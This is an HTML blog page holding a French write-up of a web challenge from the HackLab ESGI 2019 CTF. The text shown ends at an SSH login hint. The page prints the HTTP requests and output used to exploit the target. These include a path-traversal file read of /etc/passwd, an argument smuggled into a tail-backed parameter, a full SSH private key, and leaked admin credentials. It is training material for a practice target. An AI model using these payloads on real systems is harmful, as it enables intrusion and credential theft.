@@ -1,0 +1,1702 @@
+<!DOCTYPE HTML>
+
+<html>
+    <head>
+        <script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "\/"
+        },
+        "articleSection" : "write-up",
+        "name" : "[CTF] ESGI - My Name is Rookie",
+        "headline" : "[CTF] ESGI - My Name is Rookie",
+        "description" : "Write-up du challenge \x27My Name is Rookie\x27 (Web, 350 pts) du CTF HackLab ESGI 2019.",
+        "inLanguage" : "en",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2019",
+        "datePublished": "2019-04-07 20:21:54 \x2b0000 UTC",
+        "dateModified" : "2019-04-07 20:21:54 \x2b0000 UTC",
+        "url" : "\/write-up\/ctf-esgi-my-name-is-rookie-350\/",
+        "wordCount" : "2002",
+        "keywords" : [ "CTF","LFI","Proxychains","Tomcat","RCE","Blog" ]
+    }
+    </script>
+        
+            
+                <title>[CTF] ESGI - My Name is Rookie</title>
+            
+        
+
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="generator" content="Hugo 0.68.3" />
+        
+
+
+        
+        
+            <meta name="description" content="Write-up du challenge &#39;My Name is Rookie&#39; (Web, 350 pts) du CTF HackLab ESGI 2019.">
+        
+
+        <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[CTF] ESGI - My Name is Rookie"/>
+<meta name="twitter:description" content="Write-up du challenge &#39;My Name is Rookie&#39; (Web, 350 pts) du CTF HackLab ESGI 2019."/>
+<meta name="twitter:site" content="@v0nkrafft"/>
+
+        <meta property="og:title" content="[CTF] ESGI - My Name is Rookie" />
+<meta property="og:description" content="Write-up du challenge &#39;My Name is Rookie&#39; (Web, 350 pts) du CTF HackLab ESGI 2019." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/write-up/ctf-esgi-my-name-is-rookie-350/" />
+<meta property="article:published_time" content="2019-04-07T20:21:54+00:00" />
+<meta property="article:modified_time" content="2019-04-08T21:32:30+00:00" />
+
+        <meta property="og:image" content="//images/logo.png">
+        <meta property="og:image:type" content="image/png">
+        <meta property="og:image:width" content="512">
+        <meta property="og:image:height" content="512">
+        <meta itemprop="name" content="[CTF] ESGI - My Name is Rookie">
+<meta itemprop="description" content="Write-up du challenge &#39;My Name is Rookie&#39; (Web, 350 pts) du CTF HackLab ESGI 2019.">
+<meta itemprop="datePublished" content="2019-04-07T20:21:54&#43;00:00" />
+<meta itemprop="dateModified" content="2019-04-08T21:32:30&#43;00:00" />
+<meta itemprop="wordCount" content="2002">
+
+
+
+<meta itemprop="keywords" content="CTF,LFI,Proxychains,Tomcat,RCE," />
+        
+
+        
+            
+        
+
+        
+        
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,800,900|Source+Sans+Pro:400,700">
+            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.css">
+            <link rel="stylesheet" href="/css/main.css">
+            <link rel="stylesheet" href="/css/add-on.css">
+            <link rel="stylesheet" href="/css/academicons.min.css">
+        
+
+        
+            
+                
+            
+        
+
+
+  
+    
+    <link href='//cdn.bootcss.com/highlight.js/9.11.0/styles/github.min.css' rel='stylesheet' type='text/css' />
+  
+
+
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-24449159-3', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    </head>
+    <body>
+
+      
+      <div id="wrapper">
+
+    
+    
+<header id="header">
+    <h1><a href="/">vonKrafft</a></h1>
+
+    <nav class="links">
+        <ul>
+            
+                <li>
+                    <a href="/securite/">
+                            <i class="fa fa-lock">&nbsp;</i>Sécurité
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/console/">
+                            <i class="fa fa-code">&nbsp;</i>Console
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/actus/">
+                            <i class="fa fa-newspaper-o">&nbsp;</i>Actus
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/dossiers/">
+                            <i class="fa fa-book">&nbsp;</i>Dossiers
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/guides/">
+                            <i class="fa fa-laptop">&nbsp;</i>Guides
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tutoriels/">
+                            <i class="fa fa-flask">&nbsp;</i>Tuto
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/works/">
+                            <i class="fa fa-rocket">&nbsp;</i>Works
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/contact/">
+                            <i class="fa fa-id-card-o">&nbsp;</i>Contact
+                    </a>
+                </li>
+            
+        </ul>
+    </nav>
+    <nav class="main">
+        <ul>
+            <li class="menu">
+                <a class="fa-bars" href="#menu">Menu</a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+
+<section id="menu">
+
+    
+        <section>
+            <ul class="links">
+                
+                    <li>
+                        <a href="/securite/">
+                            <h3>
+                                <i class="fa fa-lock">&nbsp;</i>Sécurité
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/console/">
+                            <h3>
+                                <i class="fa fa-code">&nbsp;</i>Console
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/actus/">
+                            <h3>
+                                <i class="fa fa-newspaper-o">&nbsp;</i>Actus
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/dossiers/">
+                            <h3>
+                                <i class="fa fa-book">&nbsp;</i>Dossiers
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/guides/">
+                            <h3>
+                                <i class="fa fa-laptop">&nbsp;</i>Guides
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/tutoriels/">
+                            <h3>
+                                <i class="fa fa-flask">&nbsp;</i>Tuto
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/works/">
+                            <h3>
+                                <i class="fa fa-rocket">&nbsp;</i>Works
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/contact/">
+                            <h3>
+                                <i class="fa fa-id-card-o">&nbsp;</i>Contact
+                            </h3>
+                        </a>
+                    </li>
+                
+            </ul>
+        </section>
+
+    
+        <section class="recent-posts">
+            <div class="mini-posts">
+                <header>
+                    <h3>Recent Posts</h3>
+                </header>
+                
+
+                
+                    
+                
+
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/tutoriels/prises-conectees-sonoff-tasmota/">Des prises connectées Sonoff avec Tasmota</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-03-29'>
+                                    29 mars 2020</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/write-up/ctf-esgi-my-name-is-rookie-350/">[CTF] ESGI - My Name is Rookie</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-04-07'>
+                                    7 avril 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/console/serveur-web-docker-nginx-php-postgres/">Serveur Web avec Docker : Nginx, PHP et PostgreSQL</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-03-18'>
+                                    18 mars 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/guides/installer-python-3.7-debian-9-strecth/">Installer Python 3.7 sur Debian 9 Stretch</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-03-04'>
+                                    4 mars 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/console/simple-site-php-avec-docker-nginx/">Un simple site en PHP avec Docker et Nginx</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2019-02-25'>
+                                    25 février 2019</time>
+                            </header>
+                            
+
+                        </article>
+                
+
+                
+                    <a href=
+                        
+                            /page/2
+                        
+                        class="button">Voir plus d'articles</a>
+                
+            </div>
+        </section>
+
+    
+        
+</section>
+
+    <section id="share-menu">
+    <section id="social-share-nav">
+        <ul class="links">
+            <header>
+                <h3>Share this post <i class="fa fa-smile-o"></i></h3>
+            </header>
+            
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fwrite-up%2fctf-esgi-my-name-is-rookie-350%2f&amp;text=%5bCTF%5d%20ESGI%20-%20My%20Name%20is%20Rookie&amp;via=v0nkrafft" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+<li>
+  <a href="//plus.google.com/share?url=%2fwrite-up%2fctf-esgi-my-name-is-rookie-350%2f" target="_blank" class="share-btn google-plus">
+    <i class="fa fa-google-plus"></i>
+    <p>Google+</p>
+  </a>
+</li>
+
+
+
+
+
+<li>
+  <a href="//www.facebook.com/sharer/sharer.php?u=%2fwrite-up%2fctf-esgi-my-name-is-rookie-350%2f" target="_blank" class="share-btn facebook">
+    <i class="fa fa-facebook"></i>
+    <p>Facebook</p>
+    </a>
+</li>
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fwrite-up%2fctf-esgi-my-name-is-rookie-350%2f&amp;title=%5bCTF%5d%20ESGI%20-%20My%20Name%20is%20Rookie" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fwrite-up%2fctf-esgi-my-name-is-rookie-350%2f&amp;title=%5bCTF%5d%20ESGI%20-%20My%20Name%20is%20Rookie" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.stumbleupon.com/submit?url=%2fwrite-up%2fctf-esgi-my-name-is-rookie-350%2f&amp;title=%5bCTF%5d%20ESGI%20-%20My%20Name%20is%20Rookie" target="_blank" class="share-btn stumbleupon">
+    <i class="fa fa-stumbleupon"></i>
+    <p>StumbleUpon</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.pinterest.com/pin/create/button/?url=%2fwrite-up%2fctf-esgi-my-name-is-rookie-350%2f&amp;description=%5bCTF%5d%20ESGI%20-%20My%20Name%20is%20Rookie" target="_blank" class="share-btn pinterest">
+    <i class="fa fa-pinterest-p"></i>
+    <p>Pinterest</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="mailto:?subject=Check out this post by &amp;body=%2fwrite-up%2fctf-esgi-my-name-is-rookie-350%2f" target="_blank" class="share-btn email">
+    <i class="fa fa-envelope"></i>
+    <p>Email</p>
+  </a>
+</li>
+
+
+        </ul>
+    </section>
+</section>
+
+    
+    <div id="main">
+        
+        
+        <article class="post">
+  <header>
+    <div class="cover" style="background-image: url(/media/2019/04/521d3bc39a409ad016ea111cc08c63cb.png)"></div>
+    <div class="title">
+        
+            <h1><a href="/write-up/ctf-esgi-my-name-is-rookie-350/">[CTF] ESGI - My Name is Rookie</a></h1>
+            
+        
+        
+            <p>Write-up du challenge &#39;My Name is Rookie&#39; (Web, 350 pts) du CTF HackLab ESGI 2019.</p>
+        
+    </div>
+    <div class="meta meta-write-up">
+        
+
+        <time class="published"
+            datetime='2019-04-07'>
+            7 avril 2019</time>
+        <span class="author"></span>
+
+        
+            <p>10 minutes de lecture</p>
+        
+    </div>
+</header>
+
+
+  
+
+  
+
+  <div id="content">
+    <blockquote>
+<p>M0th3r &gt; Quelque chose me perturbe. Comment un Androïde a pu passer le test des pirates cybernétique. Duke le premier de son genre n’a été crée par personne du gouvernement. Aujourd’hui disparu je veux retrouver son core. Si tu veux m’aider, tu dois passer le test des pirate Cybernétique. C’est le test que Duke-083 a passé haut la main. Récupère tout ce que tu sais sur Zedcorp.</p>
+<p>http = ctf.hacklab-esgi.org:5008 \<br>
+ssh = ctf.hacklab-esgi.org:5007</p>
+</blockquote>
+<h2 id="le-site-web-de-zedcorp">Le site Web de ZedCorp</h2>
+<p>L'énoncé nous donne deux ports TCP, un service HTTP et un accès SSH. Nous pouvons donc d&rsquo;ores et déjà supposer que nous trouverons de quoi nous connecter en SSH via le site Web.</p>
+
+
+
+    
+    
+        
+        
+        
+        
+        
+    
+
+    
+    
+    
+    
+
+    
+    
+
+
+
+
+
+
+
+  
+
+
+    
+
+    <figure>
+        
+            <span class="image center">
+                <img src="/media/2019/04/f985a3e2f9df45bc87ae58c729e769a6.png" alt="Page d&#39;accueil ZedCorp">
+            </span>
+        
+        
+    </figure>
+
+
+<p>En cherchant un peu sur le site, nous pouvons remarquer la présence d&rsquo;un fichier <code>robots.txt</code> qui nous donne des pistes à creuser, notamment le répertoire <code>logs</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-plaintext" data-lang="plaintext">User-agent: *
+Disallow: /assets
+Disallow: /js
+Disallow: /api
+Disallow: /logs
+Disallow: /images</code></pre></td></tr></table>
+</div>
+</div>
+<p>Fort heureusement, l&rsquo;auteur du challenge à été gentil et nous a laissé du Directory Listing. Nous avons donc 8 fichiers de logs :</p>
+
+
+
+    
+    
+        
+        
+        
+        
+        
+    
+
+    
+    
+    
+    
+
+    
+    
+
+
+
+
+
+
+
+  
+
+
+    
+
+    <figure>
+        
+            <span class="image center">
+                <img src="/media/2019/04/4e60273c13a50766930ae339ae340310.png" alt="Répertoire /logs">
+            </span>
+        
+        
+    </figure>
+
+
+<p>Dans le fichier <code>access-details.log</code>, nous trouvons des échanges HTTP complet, dont plusieurs tentatives d&rsquo;authentification sur <a href="http://ctf.hacklab-esgi.org">http://ctf.hacklab-esgi.org</a>:5008/login.php :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">192.168.123.133</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Referer</span><span class="o">:</span> <span class="l">http://192.168.123.133/login.php</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">41</span>
+<span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=5tg3l2vkf3o7ngc22qklp4mmd4</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+username=admin&amp;password=pxrAW7a4HNMBw86bc</code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="zone-dadministration-et-monitoring-des-logs">Zone d&rsquo;administration et monitoring des logs</h2>
+<p>Nous pouvons donc nous authentifier sur le site de <em>ZedCorp</em> avec le compte <strong>admin</strong>. L&rsquo;interface d&rsquo;administration propose de visualiser les journaux d&rsquo;accès et d&rsquo;erreur du serveur Web. Pour cela, une requête <code>POST</code> est envoyée avec le nom du fichier de log en paramètre. Naturellement, on essaye de récupérer un autre fichier et cela fonctionne merveilleusement bien :)</p>
+<p><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/0cc175b9c0f1b6a831c399e269772661/admin.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">ctf.hacklab-esgi.org:5008</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Referer</span><span class="o">:</span> <span class="l">http://ctf.hacklab-esgi.org:5008/0cc175b9c0f1b6a831c399e269772661/admin.php</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">38</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=urj94cee9424reig3bje31b0a2</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+log=../../../../../../../../etc/passwd</code></pre></td></tr></table>
+</div>
+</div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-plaintext" data-lang="plaintext">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:110::/var/run/dbus:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+test:x:1001:1001:,,,:/home/test:/usr/sbin/nologin
+trobin:x:1004:1004:Thibaud Robin,8,0145674356,0145674356,Trainee full stack developer:/home/trobin:/bin/bash</code></pre></td></tr></table>
+</div>
+</div></p>
+<h2 id="se-connecter-en-ssh">Se connecter en SSH</h2>
+<p>N&rsquo;oublions pas que l'énoncé comportait un port SSH (TCP/5007). Précédement, nous avons vu qu&rsquo;il y a deux utilisateurs sur le serveur : <strong>test</strong> et <strong>trobin</strong>. En utilisant la LFI, nous pouvons trouver les clés RSA de l&rsquo;utilisateur <strong>test</strong> dans le répertoire <code>/home/test/.ssh</code> :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-plaintext" data-lang="plaintext">svu/zHqzzrRsm1un3Ikcvy0lnG31sg6kJ8EXH6ECgYEApe/Wv2KD+EDRwf4BQ19W
+a2gPYIQgqraR+WHG0mL3diC58Y+uJMz3rulV47KZuYNrLL05vfLxNcEbRoKW6H1g
+NmFXExuFkuPpG6oLEYVM62Bm8pksA/tkC907CY/cG4sGUYB4Rv0qKHCXrByMqp/u
+SoqMrjef2P/wD2EfzCkz2AECgYBIr98m6VrLUvri7vVqjFSewcTR1k+zyF7byLFt
+3Hj9WG7xYvruq2w/5TK4bGYXbopxOj5naab9EVvsyF5+twc/vPiy2VjT76Z1fwJG
+BmEHuy9V07r2FWnYWlQHyKYvKPJ04JPdWgmOdicDXLJCCdq4gV5FD6bLmdVrrj0p
+CSSSQQKBgQCI3TUMYeR/4+86B6i2sldPVtn52QrOHeaDwRfZ1Z7TRYPY6gIvKBLd
+VVU6YcP0KwZUHeUOC7qNxSCTnB7FkANad+D/7a0MGqAGCmWChS5GD6zpqhW+tKkY
+zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
+-----END RSA PRIVATE KEY-----</code></pre></td></tr></table>
+</div>
+</div>
+<p>Hum, la clé RSA privée n&rsquo;a pas l&rsquo;air complète. Effectivement, pour afficher les logs (fonctionnalité d&rsquo;origine de la zone d&rsquo;administration, rappelez-vous &hellip;), le fichier est tronqué pour n&rsquo;afficher que les 10 dernières lignes &hellip; 10 lignes &hellip; <code>tail</code> ? Essayons avec l&rsquo;option <code>-n 100</code> &hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/0cc175b9c0f1b6a831c399e269772661/admin.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">ctf.hacklab-esgi.org:5008</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Referer</span><span class="o">:</span> <span class="l">http://ctf.hacklab-esgi.org:5008/0cc175b9c0f1b6a831c399e269772661/admin.php</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">38</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=urj94cee9424reig3bje31b0a2</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+log=../../../../../../../../home/test/id_rsa -n 100</code></pre></td></tr></table>
+</div>
+</div>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-plaintext" data-lang="plaintext">-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA1f3hWbx2726sOiwm+gg8Td2261E7QSJhQHcQFEns7Ubonx6E
++YU4BgzQt136gK42RwoGOph8H/Tu0zfjGIx9IQOIDG8VmCItfUDFCexoqoZB2cj2
+9sLKgA/VZqRJiSka1+uibcyIgFnyDegbSXt42J6XL6xZaT56aq539s8M/aFSWNEf
+8yTBG7k4E0ZWqexBhXDK3rNJ1veH3EcJXBjYgitDLXSS/VPE7op6MlD5q7ZdNt28
+45idJ5tT+U8xrht71oGiIswxi1dXz0VvjXOIJIk1iQIyRdiGIvPpHIY+Dxw2FTHo
+pi7Z3M5hjoq36LQryHjVbUVaUrvkyeQtZXeDIQIDAQABAoIBAHloJrhAwsGo6rG+
+ZwaoMX6D8cmkNpgHp2Fpq4e3QWKFPmk4aX0fZd+Y2bmO6hajwEuhllMcPB/tWKoh
+JQjCfCOE22UiiP/dNC3B14h/xgopTab/642oijcJxKsNPmNBHOev2mGtDyyy2y+k
+pgaUtMVBhMkZYUjil5V7ErjGU7p5CCqeZUditEMKq9eAAq8oNGq84L0ZKqx4dyPN
+Ai36I8Nygk1SpYBod+K7lUYDDfd+ZPR/yEVhfHP9JqLdezfpeJW7SQvgc4Fb0rEY
++tvM0IfyIR/9tB7IrfNuXG6S+UjoP5eybasUMDn0sqSGYLfaq1pFZYolneDkrpeV
+9mPBoAECgYEA+LJUBHTrdKWqxtwkugg05Iu5nEMTGhUmZ4b6x2MRGeadqPF6u9+R
+0eubqX+oNWAKBgtHQSzE8faLnOJ6lc2oEN6jeukCDStYg//aIaEyZf2r/uBs0+zA
+QNO8CQ5dXK5sowaFPgqXZ0mIFUmtDOgSm6M3IRc4BK6nYlxClVzTs4ECgYEA3Eal
+GLMBNykaR0jCD1CartiTZay6ld1rCZVJWjONDgJGtzi0tW1j7Mr5jk0dwfp7cJVu
+/Dx+sc4Om/nJ3h15pvvcrKnv0kPhqXX4h+dFmz2psTKmjYjpsff0eLRJS9JHVNEb
+svu/zHqzzrRsm1un3Ikcvy0lnG31sg6kJ8EXH6ECgYEApe/Wv2KD+EDRwf4BQ19W
+a2gPYIQgqraR+WHG0mL3diC58Y+uJMz3rulV47KZuYNrLL05vfLxNcEbRoKW6H1g
+NmFXExuFkuPpG6oLEYVM62Bm8pksA/tkC907CY/cG4sGUYB4Rv0qKHCXrByMqp/u
+SoqMrjef2P/wD2EfzCkz2AECgYBIr98m6VrLUvri7vVqjFSewcTR1k+zyF7byLFt
+3Hj9WG7xYvruq2w/5TK4bGYXbopxOj5naab9EVvsyF5+twc/vPiy2VjT76Z1fwJG
+BmEHuy9V07r2FWnYWlQHyKYvKPJ04JPdWgmOdicDXLJCCdq4gV5FD6bLmdVrrj0p
+CSSSQQKBgQCI3TUMYeR/4+86B6i2sldPVtn52QrOHeaDwRfZ1Z7TRYPY6gIvKBLd
+VVU6YcP0KwZUHeUOC7qNxSCTnB7FkANad+D/7a0MGqAGCmWChS5GD6zpqhW+tKkY
+zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
+-----END RSA PRIVATE KEY-----</code></pre></td></tr></table>
+</div>
+</div>
+<p>Et voilà, nous pouvons à présent nous connecter en SSH sur le port TCP/5007 avec le compte <strong>test</strong> :</p>
+<pre><code class="language-terminal" data-lang="terminal">host:~$ ssh -i id_rsa -p 5007 test@ctf.hacklab-esgi.org 
+Linux dev-server 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 
+ 
+ ____       _  ___               
+|_  /___ __| |/ __|___ _ _ _ __  
+ / // -_) _` | (__/ _ \ &#39;_| &#39;_ \ 
+/___\___\__,_|\___\___/_| | .__/ 
+          Dev Server      |_|    
+
+[HINT] : Do you know proxychains ? 
+Last login: Sat Apr  6 05:45:38 2019 from 94.228.190.38 
+This account is currently not available. 
